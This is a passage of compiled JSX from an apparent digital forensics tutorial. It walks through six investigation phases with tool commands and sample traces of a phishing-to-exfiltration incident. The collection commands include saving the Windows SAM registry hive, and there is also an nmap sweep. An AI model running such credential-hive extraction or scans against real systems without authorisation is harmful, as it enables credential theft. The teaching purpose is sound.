      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " Think of a crime scene investigation. A detective first identifies potential evidence (a bloody knife), photographs it in place (preservation), bags it with gloves (collection), sends it to the lab (examination), runs DNA analysis (analysis), then testifies in court (presentation). Digital forensics follows the exact same chain → the \"crime scene\" is the hard drive or memory."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-1-identification",
      children: "Phase 1: Identification"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Recognize and document potential sources of evidence."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Survey the environment → identify all systems, storage media, network devices, and cloud resources that may contain evidence"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Interview stakeholders → understand what happened, when, and who was involved"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Prioritize evidence sources by volatility and relevance"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document the scene with photographs, screenshots, and network diagrams"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Create a preliminary evidence inventory log"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Linux: List mounted storage devices\nlsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE\n\n# Windows: List logical drives\nfsutil fsinfo drives\n\n# Network: Identify live hosts on the segment\nnmap -sn 192.168.1.0/24 -oA network_scan\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Survey → found 3 workstations (HR-01, FIN-02, DEV-03), 1 server (SRV-DC01), 1 NAS\nStep 2: Interview → HR-01 user reports \"files renamed to .encrypted extension at 2:30 PM\"\nStep 3: Prioritize → RAM on HR-01 (most volatile), then disk images, then NAS shares\nStep 4: Document → photographed screen showing ransomware note, saved to case file\nStep 5: Log → created case-2024-001-evidence.csv with entries for each device\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(n)"
      }), " where n = number of potential evidence sources."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal system impact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May miss evidence if scope is too narrow"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Establishes investigation roadmap"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires experienced judgment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Creates legal foundation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time pressure can cause omissions"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encrypted drives discovered during identification require immediate memory capture (keys in RAM)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Virtual machines may have snapshots that serve as alternate evidence sources"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cloud instances may auto-scale and terminate, destroying evidence"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Containerized environments (Docker/K8s) have ephemeral storage that disappears on restart"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-2-preservation",
      children: "Phase 2: Preservation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Maintain the integrity of evidence from the moment of identification. No evidence should be altered, damaged, or destroyed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Isolate the system from the network to prevent remote tampering"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use write-blockers for all storage media acquisition"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Calculate cryptographic hashes (SHA-256) of original evidence"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document the preservation method used for each item"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Secure evidence in locked, access-controlled storage"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Calculate SHA-256 hash of a disk device (before imaging)\nsha256sum /dev/sdb > /evidence/case-001/original-hash.txt\n\n# Calculate SHA-256 hash of a file\nsha256sum suspicious_file.exe\n\n# Windows: CertUtil for hash computation\ncertutil -hashfile suspicious_file.exe SHA256\n\n# Verify integrity after imaging\nsha256sum /evidence/case-001/disk-image.dd\ndiff <(sha256sum /evidence/case-001/disk-image.dd) /evidence/case-001/original-hash.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Isolate → unplugged Ethernet cable from HR-01, disabled WiFi in BIOS\nStep 2: Write-blocker → connected hard drive via Tableau T35u write-blocker\nStep 3: Hash → SHA-256: a8f5f167f44f4964e6c998d... → saved to evidence log\nStep 4: Document → \"HR-01 SATA SSD imaged using dd with write-blocker at 15:45 UTC\"\nStep 5: Secure → evidence stored in safe #2, access logged in Chain of Custody form\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(p)"
      }), " where p = preservation actions taken."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ensures legal admissibility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Write-blockers require specialized hardware"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Creates verifiable integrity chain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network isolation may alert attackers"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Protects against spoliation claims"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Live system preservation is complex"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "RAID arrays require special preservation → document the RAID configuration before disassembly"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Hardware-backed encryption (TPM, BitLocker) may auto-unlock on boot → never reboot"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cloud volumes can be snapshotted without shutting down (AWS EBS snapshots preserve state)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Self-encrypting drives (SED) may lock on power loss → capture while powered on"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-3-collection",
      children: "Phase 3: Collection"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Acquire evidence using forensically sound methods, following the Order of Volatility."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Collect volatile data first (RAM, network connections, running processes)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Capture non-volatile data (hard drives, SSDs, USB storage)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Collect network logs, firewall logs, and SIEM data"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Acquire cloud service logs (CloudTrail, Azure Activity Log, GCP Audit Logs)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document collection time, method, and tool used for each item"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Memory acquisition with LiME (Linux)\nsudo insmod lime.ko \"path=/evidence/case-001/memory.lime format=lime\"\n\n# Memory acquisition with FTK Imager (Windows)\n# GUI: File → Capture Memory → select destination path\n\n# Disk imaging with dd\nsudo dd if=/dev/sdb of=/evidence/case-001/hdd-image.dd bs=4M conv=noerror,sync\n\n# Disk imaging with dc3dd (forensic dd with built-in hashing)\nsudo dc3dd if=/dev/sdb of=/evidence/case-001/hdd-image.dd hash=sha256 log=acquisition.log\n\n# Live response: collect system information\n# Windows:\nwevtutil epl System C:\\evidence\\System.evtx\nwevtutil epl Security C:\\evidence\\Security.evtx\nreg save HKLM\\SYSTEM C:\\evidence\\SYSTEM.hive\nreg save HKLM\\SAM C:\\evidence\\SAM.hive\nreg save HKLM\\SOFTWARE C:\\evidence\\SOFTWARE.hive\n\n# Linux:\nsudo cp /var/log/auth.log /evidence/case-001/\nsudo cp /var/log/syslog /evidence/case-001/\nsudo cp -r /var/log/apache2/ /evidence/case-001/\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: RAM capture → LiME wrote /evidence/case-001/memory.lime (16 GB, SHA-256 verified)\nStep 2: Disk imaging → dd of /dev/sdb completed at 8 MB/s, 10:23 elapsed, no errors\nStep 3: Network logs → exported pfSense firewall logs from 2:00 PM to 4:00 PM window\nStep 4: Cloud logs → AWS CloudTrail exported to S3 bucket evidence-2024-cloudtrail\nStep 5: Logged → all items timestamped in collection manifest\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(c × s)"
      }), " where c = collection methods, s = size of evidence."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Captures evidence before it vanishes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time-consuming for large storage"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Multiple verified copies maintain integrity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud collection requires API access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Redundant collection prevents loss"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Live collection alters system state"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "SSD TRIM may permanently erase deleted files during acquisition → use write-blocker"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "RAM capture on systems with >64 GB may take hours over network"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Hypervisor memory captures (VMware .vmem) capture the entire VM state"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Containers: capture docker diff and container filesystem layers separately"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-4-examination",
      children: "Phase 4: Examination"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Extract and prepare data from the collected evidence using forensic tools. This phase identifies potential evidence without interpreting it."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Recover deleted files from unallocated space"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Extract relevant artifacts (registry hives, event logs, browser history)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Perform keyword searches across the evidence corpus"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Reconstruct timelines using file system metadata and logs"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Carve files from unallocated space based on file signatures"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Sleuth Kit: List files in an image\nfls -r -m / evidence-image.dd > bodyfile.txt\n\n# Sleuth Kit: Recover deleted files\nicat evidence-image.dd 128 > recovered_file.pdf\n\n# Autopsy: Timeline analysis\n# Tools → Timeline → generate timeline from ingested data\n\n# Bulk Extractor: Extract features without parsing file system\nbulk_extractor -o /evidence/bulk_output/ evidence-image.dd\n\n# PhotoRec: File carving (recovers based on file signatures)\nsudo photorec /evidence/case-001/evidence-image.dd\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Deleted files → fls identified 47 deleted files in Documents folder\nStep 2: Artifacts → extracted NTUSER.DAT, UsrClass.dat, 3 evtx files\nStep 3: Keywords → searched for \"password\", \"admin\", \"192.168.\" → 142 hits\nStep 4: Timeline → Plaso generated super timeline from 2024-01-01 to 2024-06-15\nStep 5: Carving → PhotoRec recovered 284 files including 12 JPEG, 3 PDF, 1 ZIP\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(d × f)"
      }), " where d = data volume, f = number of files/artifacts."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Recovers evidence from unallocated space"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Processing time scales with storage size"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Automated carving reduces manual effort"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "False positives in file carving"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Creates structured data for analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires training in tool usage"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encrypted files cannot be examined without decryption keys"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Corrupted MFT/GPT may require manual reconstruction"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Solid-state drives with TRIM may have unrecoverable deleted files"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "RAID striping requires logical volume reconstruction before examination"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-5-analysis",
      children: "Phase 5: Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Draw conclusions from the examined data. This is where evidence is correlated, timelines are interpreted, and the story of the incident is reconstructed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Correlate evidence across multiple sources (disk + memory + network logs)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify the attack vector and initial compromise point"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Track lateral movement through the environment"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Determine data exfiltration scope and method"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attribute actions to specific users, processes, or external actors"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Plaso / log2timeline: Create super timeline\nlog2timeline.py --storage-file /evidence/case-001/timeline.plaso /evidence/case-001/disk-image.dd\npsort.py -w /evidence/case-001/timeline.csv /evidence/case-001/timeline.plaso\n\n# Timeline Explorer (Eric Zimmerman):\n# Load the CSV into Timeline Explorer for filtering and analysis\n\n# MFT: Extract file creation/modification/access timelines\nMFTECmd.exe -f \"$MFT\" --csv timeline-output.csv\n\n# Correlation: Cross-reference process creation with network connections\n# Volatility: extract process tree\nvol -f memory.lime windows.pstree\n# Compare with Zeek conn.log timestamps\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Correlation → Process \"powershell.exe\" (PID 4521) started at 14:32:15.\n  Two seconds later, outbound HTTPS connection to 185.234.72.18:443 (Zeek conn.log).\n  This IP is known Cobalt Strike C2 (Threat Intelligence).\nStep 2: Attack vector → Email attachment opened by user jdoe at 14:30:00.\n  Attachment: Invoice_2024-06-15.docm (macro-enabled).\nStep 3: Lateral movement → From jdoe's workstation, PsExec to SRV-DB01 at 14:45:00.\nStep 4: Exfiltration → 1.2 GB data transferred via FTP to 198.51.100.50 at 15:10:00.\nStep 5: Attribution → Email originated from spoofed vendor domain with Russian-language metadata.\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(e × c)"
      }), " where e = evidence items, c = correlation paths."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Provides actionable intelligence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High skill requirement for analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reconstructs complete attack chain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Correlation across sources is time-intensive"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Supports attribution and remediation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Circumstantial evidence requires careful interpretation"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Log clock skew → timestamps across systems may not be synchronized (use NTP delta analysis)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Anti-forensics → attackers may tamper with logs (logwiper, timestomping)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encrypted C2 traffic → only metadata available without decryption"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "False attribution → attackers may plant evidence pointing to other groups (false flag)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "phase-6-presentation",
      children: "Phase 6: Presentation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Communicate findings clearly to stakeholders, legal teams, and potentially juries."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Prepare an executive summary for non-technical stakeholders"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Create a detailed technical report with evidence citations"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Include visual aids (timelines, network diagrams, screenshots)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document chain of custody and evidence integrity verification"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Provide expert testimony if required for legal proceedings"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Plaso: Export timeline for presentation\npsort.py -o l2tcsv -w presentation-timeline.csv timeline.plaso\n\n# Autopsy: Generate HTML report\n# Tools → Generate Report → HTML\n\n# D3.js / Mermaid: Create attack flow diagrams\nmermaid timeline.mmd\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run Trace:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Executive Summary → \"Attack originated from spear-phish email, exfiltrated 1.2 GB of customer data\"\nStep 2: Technical Report → 47 pages including tool outputs, hash verifications, evidence log\nStep 3: Visual Aids → Timeline of events (14:30 to 15:10), network flow diagram, C2 IP geolocation\nStep 4: COC → Signed chain of custody form with 6 transfers, all hashes verified\nStep 5: Testimony → Investigator served as expert witness in deposition\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity: O(p)"
      }), " where p = presentation effort."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Makes findings actionable for decision-makers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Simplification may omit technical nuance"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Creates legally defensible record"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires effective communication skills"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Supports organizational learning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time-consuming to prepare thoroughly"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Language barriers → non-native stakeholders may need translated summaries"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Classified evidence → handling restrictions may limit what can be disclosed"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Multiple jurisdictions → different countries have varying admissibility standards"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Ongoing litigation → attorney-client privilege may restrict report distribution"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "2-chain-of-custody",
      children: "2. Chain of Custody"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A FedEx tracking number. Every scan, every signature, every handoff is recorded. If the box arrives damaged, you can see exactly where it happened. Chain of custody is the \"FedEx tracking\" for digital evidence."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Chain of custody (CoC) is a formal document that tracks the seizure, custody, control, transfer, analysis, and disposition of evidence. Every person who handles the evidence must sign the CoC form, creating an unbroken chronological record."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "required-components-of-a-chain-of-custody-form",
      children: "Required Components of a Chain of Custody Form"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Case Identifier"
        }), " → unique number for the investigation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
